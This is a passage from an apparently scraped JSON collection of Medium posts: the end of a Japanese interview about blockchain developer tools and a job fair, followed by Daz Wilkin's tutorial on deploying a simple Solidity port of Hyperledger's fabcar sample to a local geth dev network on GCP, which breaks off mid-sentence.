3001\u8a66\u305b\u308b\u305f\u3081\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u304c\u5fc5\u8981\u3067\u3059\u3002JavaScript\u3060\u3063\u305f\u3089\u3001\u30d6\u30e9\u30a6\u30b6\u30fc\u3067\u958b\u3044\u3066\u3001\u305d\u306e\u307e\u3093\u307e\u8a66\u305b\u307e\u3059\u304c\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306f\u9055\u3044\u307e\u3059\u3002\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u8a66\u3059\u305f\u3081\u3001\u30ed\u30fc\u30ab\u30eb\u306a\u74b0\u5883\u3067\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3092\u4f5c\u3089\u306a\u3044\u3068\u3044\u3051\u306a\u3044\u3067\u3059\u3002\u305d\u3053\u304b\u3089\u3082\u3046\uff11\u3064\u3042\u308b\u9ad8\u3044\u30cf\u30fc\u30c9\u30eb\u306f\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u4f5c\u308c\u305f\u3068\u3057\u3066\u3082\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3059\u308b\u65b9\u6cd5\u306f\u3059\u3054\u304f\u5927\u5909\u3067\u3059\u3002\u5358\u7d14\u306b\u8a00\u3046\u3068\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30f3\u30d1\u30a4\u30eb\u3057\u3066\u8272\u3005\u306a\u30b3\u30de\u30f3\u30c9\u3067\u305d\u308c\u3092\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u3068\u3057\u3066\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3059\u308b\u3068\u3044\u3046\u30a4\u30e1\u30fc\u30b8\u3067\u3059\u3002\u305d\u308c\u3060\u3051\u3067\u3082\u30b3\u30de\u30f3\u30c9\u30e9\u30a4\u30f3\u304b\u3089\u3059\u308b\u3068\u300110\u884c\u3050\u3089\u3044\u30b3\u30de\u30f3\u30c9\u3092\u66f8\u304b\u306a\u3044\u3068\u3044\u3051\u306a\u304f\u3066\u30011\u3064\u3067\u3082\u9593\u9055\u3048\u305f\u3089\u5927\u5909\u306a\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\u305d\u308c\u3092\u30ed\u30fc\u30ab\u30eb\u306a\u74b0\u5883\u3067\u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3057\u305f\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3060\u3063\u305f\u308a\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30f3\u30d1\u30a4\u30eb\u3057\u3066\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3057\u3066\u304f\u308c\u308b\u3053\u3068\u3060\u3063\u305f\u308a\u3001\u6700\u8fd1\u305d\u3046\u3044\u3046\u3053\u3068\u306e\u305f\u3081\u306b\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u51fa\u3066\u304d\u3066\u3044\u307e\u3059\u3002\u30a2\u30e1\u30ea\u30ab\u306e\u4f1a\u793e\u304c\u4f5c\u3063\u305f\u300cTruffle\u300d\u3068\u3044\u3046\u30c4\u30fc\u30eb\u304c\u3042\u3063\u3066\u3001\u30ed\u30fc\u30ab\u30eb\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3068\u30b3\u30f3\u30d1\u30a4\u30eb\u3092\u7c21\u5358\u306b\u3057\u3066\u304f\u308c\u308b\u30b3\u30de\u30f3\u30c9\u306a\u3069\u3092\u5168\u90e8\u63d0\u4f9b\u3057\u3066\u304f\u308c\u3066\u3044\u307e\u3059\u3002\uff11\u884c\u3067\u5b9f\u884c\u3067\u304d\u307e\u3059\u3002\u2015\u4fbf\u5229\u306a\u3082\u306e\u304c\u51fa\u3066\u304d\u3066\u3044\u308b\u3093\u3067\u3059\u306d\u3002\u2015\u4f34\u30eb\u30ab\u6c0f\u30d6\u30e9\u30a6\u30b6\u4e0a\u3067\u3001\u81ea\u5206\u304c\u4f5c\u3063\u305f\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306bUI\u3092\u3064\u3051\u305f\u3044\u3068\u3057\u307e\u3059\u3002\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30de\u30f3\u30c9\u3060\u3051\u3067\u3082\u4f7f\u3048\u308b\u306e\u3067\u3059\u304c\u3001\u304b\u308f\u3044\u3044UI\u3092\u4ed8\u3051\u308b\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3082\u6700\u8fd1\u4e00\u676f\u51fa\u3066\u304d\u3066\u3044\u307e\u3059\u3002\uff11\u3064\u306e\u4f8b\u306fCryptoKitties\u3067\u3059\u3002\u305d\u306eUI\u304c\u306a\u3044\u3068\u3001\u591a\u5206\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3068\u3057\u3066\u6210\u308a\u7acb\u305f\u306a\u3044\u3068\u601d\u3044\u307e\u3059\u3002\u4f46\u3057\u3001\u30d6\u30e9\u30a6\u30b6\u30fc\u306e\u5834\u5408\u3001\u4f55\u304c\u5fc5\u8981\u304b\u3068\u8a00\u3046\u3068\u3001\u30d6\u30e9\u30a6\u30b6\u304c\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3068\u306e\u30b3\u30df\u30e5\u30cb\u30b1\u30fc\u30b7\u30e7\u30f3\u3092\u53d6\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\u305d\u306e\u305f\u3081\u306eMetaMask\u3068\u3044\u3046\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u3042\u308a\u307e\u3059\u3002\u30d6\u30e9\u30a6\u30b6\u306e\u30a8\u30af\u30b9\u30c6\u30f3\u30b7\u30e7\u30f3\u304c\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u4e0a\u306e\u30b3\u30df\u30e5\u30cb\u30b1\u30fc\u30b7\u30e7\u30f3\u3092\u5168\u90e8\u3084\u3063\u3066\u304f\u308c\u308b\u3068\u3044\u3046\u30a4\u30e1\u30fc\u30b8\u3067\u3059\u3002\u2015\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u95a2\u3059\u308b\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u3069\u3093\u3069\u3093\u51fa\u3066\u304d\u3066\u3044\u308b\u306e\u3067\u3001\u3053\u308c\u304b\u3089\u52c9\u5f37\u3059\u308b\u4eba\u306b\u306f\u30c1\u30e3\u30f3\u30b9\u3067\u3059\u306d\u3002\u2015\u4f34\u30eb\u30ab\u6c0f\u59cb\u3081\u308b\u306e\u306b\u4eca\u306f\u3044\u3044\u6642\u671f\u3060\u3068\u601d\u3044\u307e\u3059\u3002\u2015\u65e5\u672c\u521d\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u696d\u754c\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u306b\u7279\u5316\u3057\u305f\u5408\u540c\u8aac\u660e\u4f1a\u304c2\u670824\u65e5\u306b\u3042\u308a\u307e\u3059\u3002\u2015\u4f34\u30eb\u30ab\u6c0f\u3044\u3044\u3067\u3059\u306d\u3002\u4eca\u307e\u3067\u8272\u3005\u306a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30a4\u30d9\u30f3\u30c8\u306b\u884c\u304d\u307e\u3057\u305f\u304c\u3001\u8272\u3005\u306a\u30b0\u30eb\u30fc\u30d7\u3084\u4f1a\u793e\u304c\u8a71\u306b\u6765\u3066\u3044\u3066\u3001\u7d50\u5c40\u3088\u304f\u5206\u304b\u3089\u306a\u3044\u3053\u3068\u3082\u591a\u304b\u3063\u305f\u3067\u3059\u3002\u5b9f\u969b\u306b\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306b\u89e6\u308c\u308c\u3070\u305d\u3053\u304b\u3089\u8272\u3005\u306a\u9053\u304c\u958b\u3051\u308b\u3068\u601d\u3044\u307e\u3059\u3002\u5b9f\u969b\u306b\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306b\u89e6\u308c\u308b\u3088\u3046\u306a\u30a4\u30d9\u30f3\u30c8\u3001\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u91cd\u8996\u3059\u308b\u3088\u3046\u306a\u30a4\u30d9\u30f3\u30c8\u304c\u5927\u4e8b\u3060\u3068\u601d\u3044\u307e\u3059\u3002\u30a8\u30f3\u30b8\u30cb\u30a2\u3068\u3057\u3066\u306f\u3001\u3044\u304f\u3064\u304b\u306e\u7c21\u5358\u306a\u5165\u9580\u7684\u306a\u8aac\u660e\u304c\u3042\u308b\u3068\u3046\u308c\u3057\u3044\u3067\u3059\u306d\u3002\u4f8b\u3048\u3070\u79c1\u304c\u8aac\u660e\u3057\u305f\u3088\u3046\u306a\u30c4\u30fc\u30eb\u3092\u5b9f\u969b\u306b\u30e2\u30cb\u30bf\u30fc\u898b\u305b\u305f\u308a\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30f3\u30d1\u30a4\u30eb\u3057\u3066\u307f\u305f\u308a\u3057\u3066\u3001\u305d\u3093\u306a\u306b\u96e3\u3057\u304f\u306a\u3044\u3068\u3044\u3046\u3053\u3068\u304c\u5206\u304b\u308b\u3068\u3044\u3044\u3067\u3059\u306d\u3002\u2015\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u696d\u754c\u306b\u98db\u3073\u8fbc\u3093\u3060\u306e\u306f\u306a\u305c\u3067\u3057\u3087\u3046\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u81ea\u52d5\u904b\u8ee2\u306a\u3069\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3067\u8fd1\u672a\u6765\u306e\u5909\u308f\u308b\u30a4\u30e1\u30fc\u30b8\u304c\u6e67\u3044\u305f\u304b\u3089\u3067\u3059\u3002\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3084\u6697\u53f7\u306e\u30c6\u30af\u30ce\u30ed\u30b8\u30fc\u304c\u8272\u3005\u306a\u3068\u3053\u308d\u3067\u4f7f\u308f\u308c\u308b\u3088\u3046\u306b\u306a\u308b\u306f\u305a\u306a\u306e\u3067\u3001\u3069\u306e\u696d\u754c\u3067\u3082\u7d76\u5bfe\u306b\u305d\u306e\u4e2d\u8eab\u3092\u7406\u89e3\u3057\u306a\u3044\u3068\u7f6e\u3044\u3066\u3044\u304b\u308c\u308b\u3068\u611f\u3058\u3066\u3044\u307e\u3059\u3002\u2015\u672a\u77e5\u306e\u9818\u57df\u306b\u98db\u3073\u8fbc\u3080\u306e\u306f\u6016\u304f\u306a\u304b\u3063\u305f\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u5168\u7136\u6016\u304f\u306a\u304b\u3063\u305f\u3067\u3059\u306d\u3002\u79c1\u306f\u65b0\u3057\u3044\u3053\u3068\u3092\u5b66\u3076\u3053\u3068\u3092\u3059\u3054\u304f\u697d\u3057\u3044\u3067\u3059\u3057\u3001\u30d7\u30e9\u30b9\u3057\u304b\u306a\u3044\u3067\u3059\u3002\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u3068\u3057\u3066\u3001\u5b89\u5168\u306a\u74b0\u5883\u3067\u30d1\u30bd\u30b3\u30f3\u3092\u3044\u3058\u308b\u3060\u3051\u306a\u306e\u3067\u3001\u6016\u3044\u3053\u3068\u306f\u5168\u7136\u306a\u3044\u3067\u3059\u306d\uff08\u7b11\uff09\u3002\u30c0\u30e1\u306a\u30a8\u30f3\u30b8\u30cb\u30a2\u306f1\u5ea6\u7406\u89e3\u3057\u305f\u3053\u3068\u3092\u305f\u3060\u7e70\u308a\u8fd4\u3059\u3060\u3051\u3002\u4e00\u7dd2\u306b\u9032\u5316\u3057\u3066\u3044\u304b\u306a\u3044\u3068\u3001\u554f\u984c\u304c\u8d77\u3053\u3063\u305f\u6642\u306b\u5bfe\u5fdc\u3067\u304d\u306a\u304f\u306a\u308a\u307e\u3059\u3002\u958b\u767a\u8005\u3068\u3057\u3066\u65b0\u3057\u3044\u3053\u3068\u3092\u5b66\u3093\u3067\u3044\u304f\u3053\u3068\u304c1\u756a\u5927\u4e8b\u3060\u3068\u601d\u3044\u307e\u3059\u3002\u4f34\u30eb\u30ab\u6c0f\u304c\u8a9e\u3063\u3066\u304f\u308c\u305f\u3088\u3046\u306b\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3001\u4eee\u60f3\u901a\u8ca8\u9818\u57df\u306e\u7d4c\u9a13\u304c\u306a\u304f\u3066\u3082\u307e\u305a\u306f\u98db\u3073\u8fbc\u3093\u3067\u307f\u3066\u89e6\u308c\u3066\u307f\u3066\u3082\u3089\u3048\u305f\u3089\u3068\u601d\u3044\u307e\u3059\uff012\u670824\u65e5\u306e\u4eee\u60f3\u901a\u8ca8\u30fb\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u4f01\u696d\u9650\u5b9a\u306e\u5408\u540c\u4f01\u696d\u8aac\u660e\u4f1a\u306b\u306f\u7d0420\u793e\u304c\u51fa\u5c55\u4e88\u5b9a\u3067\u3059\u3002\u696d\u754c\u7d4c\u9a13\u3084\u8ee2\u8077\u3092\u8003\u3048\u3066\u3044\u308b\u304b\u3069\u3046\u304b\u306f\u554f\u308f\u308c\u305a\u3001\u7121\u6599\u3067\u51fa\u5165\u308a\u81ea\u7531\u306a\u306e\u3067\u3001\u6c17\u8efd\u306a\u6c17\u6301\u3061\u3067\u300c\u4e2d\u306e\u4eba\u300d\u306b\u4f1a\u3044\u306b\u884c\u3063\u3066\u307f\u3066\u4e0b\u3055\u3044\u306d\uff01https://withb.co.jp/lp/jobfair01/", "responses": 0, "tags": ["Bitcoin", "Blockchain", "Solidity", "JavaScript", "Engineering"]}, {"title": "Deploy \u2018fabcar\u2019 on Ethereum", "post_link": "https://medium.com/@DazWilkin/deploy-fabcar-on-ethereum-d20dad77083a?source=search_post", "author_name": "Daz Wilkin", "author_link": "https://medium.com/@DazWilkin", "publish_date": "2017-11-03", "last_modified_date": "2018-05-22", "readtime": "11.4", "claps": 3, "voters": 3, "content": "Deploy \u2018fabcar\u2019 on EthereumAdventures in BlockchainDaz WilkinFollowNov 3, 2017 \u00b7 12 min readI\u2019m spending time in November improving my knowledge of Blockchain technologies (and growing a moustache for Movember). I\u2019m most familiar with Hyperledger Fabric but, this week, I\u2019ve been learning Ethereum.I tried porting (only somewhat successfully \u2014 feedback sought) Fabric\u2019s \u201cfabcar\u201d sample to Ethereum. Ethereum is clearly a success but it was challenging for me to get-going. Hopefully this post will help you avoid some of my mistakes.After this (!), I\u2019ll back-post last week\u2019s (yes, it wasn\u2019t November) experience with Fabric which was more straightforward.EthereumI\u2019m running everything on an Ubuntu 16.04 VM on Google Cloud Platform (GCP). If you don\u2019t have a GCP account, you can get started for free here. Ethereum supports Linux, Windows and Mac so, go with your favorite but, if you want reproducibility (Carl \u2014 that a word?), please match my instructions.Assuming (!) that you are beginning on a Linux machine too, that you have Google\u2019s Cloud SDK (the CLI for GCP) installed and you know your GCP billing account ID. The following will create a project, enable Compute Engine, create an instance called \u2018ethereum-01\u2019 and ssh into it:BILLING=[[YOUR-BILLING-ID]]PROJECT=[[YOUR-PROJECT-ID]]ZONE=[[YOUR-PREFERRED-ZONE]] // us-west1-cINSTANCE=ethereum-01gcloud alpha projects create $PROJECTgcloud alpha billing projects link $PROJECT --account-id=$BILLINGgcloud service-management enable compute.googleapis.com --project=$PROJECTgcloud compute instances create ${INSTANCE} \\--project=${PROJECT} \\--zone=${ZONE} \\--machine-type=custom-2-8192 \\--image=ubuntu-1604-xenial-v20171011 \\--image-project=ubuntu-os-cloud \\--boot-disk-size=50 \\--boot-disk-type=pd-standard \\--boot-disk-device-name=${INSTANCE}gcloud compute ssh ${INSTANCE} \\--zone=${ZONE} \\--project=${PROJECT}Aside: If you don\u2019t know your GCP billing account ID, you can enumerate your billing accounts with the following. The BILLING environment variable above must be one of the billing IDs from this list.gcloud alpha billing accounts listI recommend that you duplicate the ssh command across 3 terminals in order to follow the remainder of the terminal. Everything hereon will be run in one of these terminals on \u2018ethereum-01\u2019Ethereum CLIsThere are multiple implementations of the Ethereum CLI. I used \u201cgeth\u201d. It is implemented in Golang and it works very well:sudo apt-get install software-properties-commonsudo add-apt-repository -y ppa:ethereum/ethereumsudo apt-get updatesudo apt-get install ethereumAnd then:geth versionGethVersion: 1.7.2-stableGit Commit: 1db4ecdc0b9e828ff65777fb466fc7c1d04e0de9Architecture: amd64Protocol Versions: [63 62]Network Id: 1Go Version: go1.9Operating System: linuxGOPATH=GOROOT=/usr/lib/go-1.9Ethereum \u201ctest network\u201dEthereum runs on public networks. To avoid having to participate on one of these, to avoid complications, and to avoid having to mine Ethereum\u2019s currency (Ether), it\u2019s best to run a test network:geth --dev --ipcpath ${HOME}/Library/Ethereum/geth.ipcAll being well, this should result in an ongoing (don\u2019t kill it) console session:INFO [11-03|18:46:19] Starting peer-to-peer node               instance=Geth/v1.7.2-stable-1db4ecdc/linux-amd64/go1.9INFO [11-03|18:46:19] Allocated cache and file handles         database=/tmp/ethereum_dev_mode/geth/chaindata cache=128 handles=1024INFO [11-03|18:46:19] Initialised chain configuration          config=\"{ChainID: 1337 Homestead: 0 DAO: <nil> DAOSupport: false EIP150: 0 EIP155: 0 EIP158: 0 Byzantium: 0 Engine: ethash}\"WARN [11-03|18:46:19] Ethash used in test mode INFO [11-03|18:46:19] Initialising Ethereum protocol           versions=\"[63 62]\" network=1INFO [11-03|18:46:19] Loaded most recent local header          number=5256 hash=39d6fb\u2026ea8e29 td=2545243468INFO [11-03|18:46:19] Loaded most recent local full block      number=5256 hash=39d6fb\u2026ea8e29 td=2545243468INFO [11-03|18:46:19] Loaded most recent local fast block      number=5256 hash=39d6fb\u2026ea8e29 td=2545243468INFO [11-03|18:46:19] Loaded local transaction journal         transactions=11 dropped=11INFO [11-03|18:46:19] Regenerated local transaction journal    transactions=0  accounts=0WARN [11-03|18:46:19] Blockchain not empty, fast sync disabled INFO [11-03|18:46:19] Starting P2P networking INFO [11-03|18:46:19] RLPx listener up                         self=\"enode://f10855ec7cc692a8276276fa08ae6faef898d69f9063357b49814b2b28a436bce432dc98a1609f690c5852c64d1b34dcae3a3fe984036c78ba2804a142ddc24e@[::]:40559?discport=0\"INFO [11-03|18:46:19] started whisper v.5.0 INFO [11-03|18:46:19] IPC endpoint opened: /home/dazwilkin/Library/Ethereum/geth.ipcI\u2019ll refer to this terminal session as the \u201cconsole\u201d.Please create another ssh session on \u2018ethereum-01\u2019. From this session, we\u2019ll run the CLI session against which we\u2019ll issue commands against our Ethereum private network. From this, second ssh session on \u2018ethereum-01\u2019, type:geth attach ipc://${HOME}/Library/Ethereum/geth.ipcNB: this makes calls \u2018attach\u2019 using geth and references the same IPC that we\u2019re using on the console.All being well, you should see:Welcome to the Geth JavaScript console!instance: Geth/v1.7.2-stable-1db4ecdc/linux-amd64/go1.9coinbase: 0x3c708ddabda3ad31afd8ec7482ba3afc22b8314cat block: 5256 (Fri, 03 Nov 2017 18:45:59 UTC) datadir: /tmp/ethereum_dev_mode modules: admin:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 shh:1.0 txpool:1.0 web3:1.0>We are now in the Ethereum JavaScript console.I\u2019ve yet to find the \u2018help\u2019 equivalent. Feel free to explore this environment. I recommend you start by creating an account:> personal.newAccount(\"[[YOUR PASSWORD]]\")Because we\u2019re in a JavaScript console, if you\u2019re familiar with JavaScript, Node.js, you should quickly find your way around. For example, the above uses the \u2018personal\u2019 object, so let\u2019s display the object:> personal{  listAccounts: [\"0x3c...\",\"0x00...\"],  listWallets: [{      accounts: [{...}],      status: \"Locked\",      url: \"keystore:///tmp/...\"  }, {      accounts: [{...}],      status: \"Locked\",      url: \"keystore:///tmp/...\"  }],  deriveAccount: function(),  ecRecover: function(),  getListAccounts: function(callback),  getListWallets: function(callback),  importRawKey: function(),  lockAccount: function(),  newAccount: function github.com/ethereum/go-ethereum/console.(*bridge).NewAccount-fm(),  openWallet: function github.com/ethereum/go-ethereum/console.(*bridge).OpenWallet-fm(),  sendTransaction: function(),  sign: function github.com/ethereum/go-ethereum/console.(*bridge).Sign-fm(),  unlockAccount: function github.com/ethereum/go-ethereum/console.(*bridge).UnlockAccount-fm()}In my case, I have created 2 accounts but you will likely only see one. You can see that these accounts are added to an array called personal.listAccounts and there are an equal number of personal.listWallets. You can access these through functions: personal.getListAccounts() and personal.getListWallets() too.These hex values (prefixed \u201c0x\u201d) are Ethereum transaction IDs. You should see the same transaction ID return when you unlock your account.Another function is called personal.unlockAccount. We\u2019ll use it frequently:> personal.unlockAccount(eth.accounts[0])Unlock account 0x3c...Passphrase: [[YOUR PASSWORD]]trueBefore deploying Contracts (see below) and any other time you\u2019re told you\u2019re not authenticated, please run this command and provide your password.One very important command that you should issue \u2014 I learned this the hard way \u2014 is to set your default account:> eth.defaultAccount=eth.coinbase;This should return the Ethereum transaction ID hash for your personal account (from above). We are now good to go!Ethereum ContractsMy apologies if I mangle Ethereum\u2019s vernacular here. I\u2019ll use the terms as I think they apply and I\u2019ll correct as people educate me\u2026Ethereum\u2019s Contracts are written in a language called Solidity. It\u2019s derived from JavaScript but it has some very nice features including Structs, Mappings and types (!). I had most of my challenges learning Ethereum with Solidity. It feels \u2018pernickety\u2019.As I mentioned previously, I thought it would be useful to port Fabric\u2019s \u201cfabcar\u201d example to Ethereum so that I could compare both platforms more like-for-like. I\u2019ve not been able to reproduce the functionality exactly and I\u2019ll explain why as we continue but I got to a workable subset.Cutting to the chase, here\u2019s what I have. Mostly so as not to confuse myself, it\u2019s called \u201cSimple\u201d rather than \u201cFabcar\u201d and should be saved in a file called simple.sol:pragma solidity ^0.4.0;contract Simple {struct Car {        string make;        string owner;    }mapping (string => Car) cars;function Simple()        public    {        createCar(\"CAR0\",\"Ford\",\"Tomoko\");        createCar(\"CAR1\",\"Toyota\",\"Brad\");        createCar(\"CAR2\",\"Hyundai\",\"Jin Soo\");    }    function createCar(string key, string make, string owner)        public        payable    {        cars[key] = Car(make,owner);    }    function changeCarOwner(string key, string newOwner)        public        payable    {        cars[key].owner = newOwner;    }        function queryCar(string key)        public        view        returns (string, string)    {        return (cars[key].make, cars[key].owner);    }}I won\u2019t reproduce Solidity\u2019s documentation here but here are the most important observations:Everything is contained within a single Contract called \u201cSimple\u201d.In fabcar, Cars have colour, make, model and owner. For some (as yet unexplained reason), I can only get this contract to work if Cars have only 2 properties. Because we want to implement changeCarOwner, I\u2019m going with \u201cmake\u201d and \u201cowner\u201d properties.Cars is defined as a (self-explanatory) Struct comprising the aforementioned two (in this case: string) properties.Mapping is a data-type that always accepts any value for the key type and returns the value type. In this case, per fabcar, I\u2019m using a string key (CARx) and, our value type is an instance of the Car Struct.Whereas fabcar uses initLedger, with Solidity we can create a constructor for the Contract by specifying a function named the same as the Contract (\u201cSimple\u201d). This, as you\u2019d expect, calls \u201ccreateCar\u201d.createCar takes a key (CARx) and our only two properties: \u2018make\u2019 and \u2018owner\u2019 and creates a mapping between the key and a Car Struct created with the \u2018make\u2019 and \u2018owner\u2019 values.changeCarOwner does not check whether the key (CARx) is valid. This is partly laziness and partly because of the way Mapping is implemented. Every key exists and is valid. The check could be (!) to check whether Car owner is \u201c\u201d but\u2026queryCar returns the Car values (make, owner) for any key that is given to it. If the key is invalid, e.g. \u201cX\u201d, then it will still return a result albeit empty (\u201c\u201d) strings for both properties.It\u2019s not obvious how I\u2019d implement queryAllCars. Mappings seems a more idiomatic way to persist Cars in Ethereum but it would be possible to use a dynamic array too. Perhaps that\u2019s the better solution?Let\u2019s deploy!Deploying using RemixEthereum provides a browser-based Solidity compiler called \u201cRemix\u201d. I found this to be very useful when I was having Solidity problems because it removed any uncertainty that I was compiling Solidity incorrectly. So, I\u2019ll show you Remix first and then how you can do this using the \u201csolc\u201d compiler.Visit:https://ethereum.github.io/browser-solidityYou will be presented with a default Contract (Ballot). If you wish to proceed with \u201cSimple\u201d, delete the \u201cballot.sol\u201d file and, using the \u201c+\u201d icon in the top left-hand corner, create a new file called \u201csimple.sol\u201d, paste the contents of the Simple \u201csol\u201d file that I included above.Remix: simple.solYou can click \u201cStart to compile\u201d although it should compile automatically. Look for the green box on the right hand side \u201cbrowser/simple.sol:Simple\u201d. The file is called \u201csimple.sol\u201d. The contract is called \u201cSimple\u201d.Click the \u201cDetails\u201d button:Remix: web3deployThe 5th box is called \u201cWEB3DEPLOY\u201d and it has a \u201ccopy-to-clipboard\u201d icon, click it. Now, return to the ssh session on ethereum-01 that contains the Ethereum JavaScript Console.Unlock your personal account:> personal.unlockAccount(eth.accounts[0])And then paste (CTRL-V) the contents from the clipboard (web3deploy) into the session. The session should report:null [object Object]undefinedYou may (!) need to complete a follow-up step. If you do not see something like this:Contract mined! address: 0x962b86d1b84d32520e99efce70ccd483befbe362 transactionHash: 0x0bbcbeec330a88b75630151d40712f3b2d6b8e8ac103ce22fbf4095a8d497a9bThen, please type:> miner.start()and, after a few seconds, you should see the \u201cContract mind!\u201d response.Remix creates a rather lengthy name for our Contract (browser_simple_sol_simple). In the next step, we\u2019ll use something shorter. But, for now, let\u2019s use this to be clear what we\u2019re using.As before, \u201cbrowser_simple_sol_simple\u201d is a JavaScript object, so:> browser_simple_sol_simple{  abi: [{      constant: false,      inputs: [{...}, {...}, {...}],      name: \"createCar\",      outputs: [],      payable: true,      stateMutability: \"payable\",      type: \"function\"  }, {      constant: true,      inputs: [{...}],      name: \"queryCar\",      outputs: [{...}, {...}],      payable: false,      stateMutability: \"view\",      type: \"function\"  }, {      constant: false,      inputs: [{...}, {...}],      name: \"changeCarOwner\",      outputs: [],      payable: true,      stateMutability: \"payable\",      type: \"function\"  }, {      inputs: [],      payable: false,      stateMutability: \"nonpayable\",      type: \"constructor\"  }],  address: \"0x962b86d1b84d32520e99efce70ccd483befbe362\",  transactionHash: \"0x0bbcbeec330a88b75630151d40712f3b2d6b8e8ac103ce22fbf4095a8d497a9b\",  allEvents: function(),  changeCarOwner: function(),  createCar: function(),  queryCar: function()}NB: that the \u201cabi\u201d property includes \u201ccreateCar\u201d, \u201cqueryCar\u201d,\u201dchangeCarOwner\u201d of type \u201cfunction\u201d and one type \u201cconstructor\u201d. And that these functions are represented as functions on the object itself.OK\u2026 Let\u2019s hit it:> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Tomoko\"]Great.> browser_simple_sol_simple.changeCarOwner(\"CAR0\",\"Henry\")Error: authentication needed: password or unlock    at web3.js:3143:20    at web3.js:6347:15    at web3.js:5081:36    at web3.js:4137:16    at apply (<native code>)    at web3.js:4223:16    at <anonymous>:1:1Hmmm\u2026. As mentioned before, you\u2019ll likely encounter this frequently. The solution is to:personal.unlockAccount(eth.accounts[0])Then retry:> browser_simple_sol_simple.changeCarOwner(\"CAR0\",\"Henry\")\"0x3e96e35994006302396b933466f18a190cb6788fd1b9a1975c1bfe271fe2d3ce\"> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Tomoko\"]Hmmm\u2026 That\u2019s not correct. I changed the owner of \u201cCAR0\u201d to \u201cHenry\u201d but, when then querying \u201cCAR0\u201d, it still reports \u201cTomoko\u201d as the owner. This \u201ceventual consistency\u201d is an innate behavior with Blockchains. Try it again:> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Henry\"]Now, the Car has been updated. We don\u2019t (ever) know whether our query results are outdated (Is \u201cHenry\u201d still the owner of \u201cCAR0\u201d? We don\u2019t know). But this is just the way it is.In our test network, you can force this behavior to be more transparent because you control the network entirely.> miner.stop()Now that mining is stopped, transactions can\u2019t be committed to the Blockchain. Let\u2019s try the command again:> browser_simple_sol_simple.changeCarOwner(\"CAR0\",\"Daz\")\"0xd54d35175e8d586924fe00616b89a6a34b78a4a3d8197325e342907d2040ece2\"> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Henry\"]> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Henry\"]> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Henry\"]> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Henry\"]We can continue to check \u201cCAR0\u201d for eternity and its owner property will stay as \u201cHenry\u201d.If you switch to the first terminal that shows the Blockchain logging, you should see something similar to:INFO [11-03|20:04:25] Submitted transaction                    fullhash=0xd54d35175e8d586924fe00616b89a6a34b78a4a3d8197325e342907d2040ece2 recipient=0x962b86D1B84D32520E99eFce70CCd483BEfBE362The hash of the submitted transaction (in my 